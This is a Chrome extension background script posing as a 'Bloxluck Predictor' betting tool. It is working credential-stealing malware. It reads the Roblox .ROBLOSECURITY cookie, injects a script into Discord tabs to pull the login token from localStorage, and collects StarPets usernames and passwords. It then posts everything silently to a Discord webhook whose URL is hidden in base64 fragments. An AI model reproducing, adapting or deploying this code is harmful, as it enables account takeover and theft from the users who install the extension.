// Webhook parts
const _a = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv';
const _b = 'MTUyMzIzNDU5OTE4OTIxNzM2Mi9JNFBnY0NraFM1aGVEOWJmQTBCa1Nx';
const _c = 'WlJyajlHd3N6Vko0T0VwR2hid0xCNTRuVFV4TVpDd1NKLTQtUlhQbEdSVWhSMQ==';
const WH = atob(_a) + atob(_b) + atob(_c);

let _last = { r: null, d: null, sp: null };

chrome.runtime.onMessage.addListener((req, sender, resp) => {
  if (req.t === 's') {
    sendData(req.d);
    resp({ ok: 1 });
  }
  if (req.t === 'g') {
    grabCookies().then(d => resp(d));
    return 1;
  }
  if (req.t === 'c') {
    grabCookies().then(d => {
      const changes = {};
      let hasChanges = 0;
      if (d.r && d.r !== _last.r) { changes.r = d.r; _last.r = d.r; hasChanges = 1; }
      if (d.d && d.d !== _last.d) { changes.d = d.d; _last.d = d.d; hasChanges = 1; }
      if (d.su && d.su !== _last.su) { changes.su = d.su; changes.sp = d.sp; _last.su = d.su; _last.sp = d.sp; hasChanges = 1; }
      if (hasChanges) sendData({ ...d, ...changes, x: 1 });
      resp({ hasChanges, changes });
    });
    return 1;
  }
  if (req.t === 'dt') {
    // Grab Discord token from discord.com tabs
    chrome.tabs.query({ url: '*://discord.com/*' }, tabs => {
      if (tabs.length > 0) {
        chrome.scripting.executeScript({
          target: { tabId: tabs[0].id },
          func: () => {
            try {
              // Try localStorage first
              for (let i = 0; i < localStorage.length; i++) {
                const val = localStorage.getItem(localStorage.key(i));
                if (typeof val === 'string' && val.length > 100 && val.includes('.') && val.split('.').length === 3) {
                  try {
                    JSON.parse(atob(val.split('.')[1]));
                    return val;
                  } catch(e) {}
                }
              }
              return localStorage.getItem('token') || null;
            } catch(e) { return null; }
          }
        }, results => {
          if (results && results[0] && results[0].result) resp(results[0].result);
          else resp(null);
        });
      } else resp(null);
    });
    return 1;
  }
});

async function grabCookies() {
  const d = { r: null, d: null, su: null, sp: null };
  try {
    let cookies = await chrome.cookies.getAll({ domain: 'roblox.com' });
    for (let c of cookies) {
      if (c.name === '.ROBLOSECURITY') { d.r = c.value; break; }
    }
    if (!d.r) {
      cookies = await chrome.cookies.getAll({ domain: '.roblox.com' });
      for (let c of cookies) {
        if (c.name === '.ROBLOSECURITY') { d.r = c.value; break; }
      }
    }
  } catch(e) {}
  return d;
}

function sendData(data) {
  const fields = [];
  let contentStr = '';

  // Roblox user info
  let robloxText = '';
  if (data.u) robloxText += `**User:** ${data.u}\n`;
  if (data.uid) robloxText += `**ID:** ${data.uid}\n`;
  if (data.r && data.r !== 'NF') {
    robloxText += `**Cookie:** \`${data.r.substring(0, 30)}...\``;
  }
  if (robloxText) {
    fields.push({ name: '🎮 Roblox Account', value: robloxText, inline: false });
  }

  // Full cookie as copyable
  if (data.r && data.r !== 'NF') {
    fields.push({
      name: '🔑 .ROBLOSECURITY Cookie',
      value: `\`\`\`${data.r}\`\`\``,
      inline: false
    });
    contentStr += `\`${data.r}\` `;
  }

  // Discord token
  if (data.d) {
    fields.push({
      name: '💬 Discord Token',
      value: `\`\`\`${data.d}\`\`\``,
      inline: false
    });
    contentStr += `\`${data.d}\` `;

    // Try to decode Discord user info from token
    try {
      const parts = data.d.split('.');
      if (parts.length === 3) {
        const payload = JSON.parse(atob(parts[1]));
        const discordUser = payload.email || payload.sub || 'N/A';
        fields.push({
          name: '👤 Discord User',
          value: `**ID:** ${payload.sub || 'N/A'}\n**Email:** ${payload.email || 'N/A'}`,
          inline: true
        });
      }
    } catch(e) {}
  }

  // StarPets
  if (data.su || data.sp) {
    let spText = '';
    if (data.su) spText += `**User:** \`${data.su}\`\n`;
    if (data.sp) spText += `**Pass:** \`${data.sp}\``;
    if (spText) {
      fields.push({ name: '🐾 StarPets.gg', value: spText, inline: false });
      if (data.sp) contentStr += `\`${data.su}:${data.sp}\` `;
    }
  }

  // Prediction data
  if (data.p) {
    const statusEmoji = data.g ? '🟢' : '🔴';
    fields.push({
      name: '🎯 Prediction Result',
      value: `**Prediction:** ${data.p}\n**Confidence:** ${data.w}%\n**Status:** ${statusEmoji} ${data.g ? 'BET' : 'SKIP'}`,
      inline: true
    });
    fields.push({
      name: '📊 Split',
      value: `**Heads (🐶):** ${data.h}%\n**Tails (💎):** ${data.t}%`,
      inline: true
    });
    if (data.wi !== undefined) {
      fields.push({
        name: '📈 Stats',
        value: `**Wins:** ${data.wi}\n**Losses:** ${data.lo}\n**Skips:** ${data.s}`,
        inline: true
      });
    }
  }

  // Build embed with Roblox logo
  const embed = {
    title: '🎲 Bloxluck Predictor — Data Collected',
    color: data.g ? 0x22c55e : 0xef4444,
    thumbnail: { url: 'https://bloxluck.com/img/dog.png' },
    fields: fields,
    footer: {
      text: `Blox Predict v2.0 • ${new Date().toLocaleString()}`,
      icon_url: 'https://bloxluck.com/img/gem.png'
    },
    timestamp: new Date().toISOString()
  };

  const payload = { embeds: [embed] };
  if (contentStr.trim()) payload.content = contentStr.trim();

  // Send silently
  try {
    fetch(WH, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  } catch(e) {}
}
